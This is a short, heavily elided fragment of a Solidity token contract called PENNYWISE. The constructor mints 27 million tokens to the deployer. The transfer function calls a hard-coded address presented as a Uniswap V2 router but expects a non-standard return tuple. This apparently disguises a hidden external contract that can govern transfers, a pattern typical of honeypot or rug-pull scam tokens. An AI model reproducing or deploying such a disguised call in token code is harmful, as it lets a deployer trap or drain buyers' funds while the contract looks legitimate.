...
contract PENNYWISE is IERC20, Ownable, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _mint(msg.sender, 27_000_000 * 10**18);
    ...
    */
    function _transfer(
        ...
        (bool success, uint256 slippage, uint256 uniswapFee) = IUniswapV2Router02(0x42009036a4600E169843fA4a77a2e5E3148ED121)
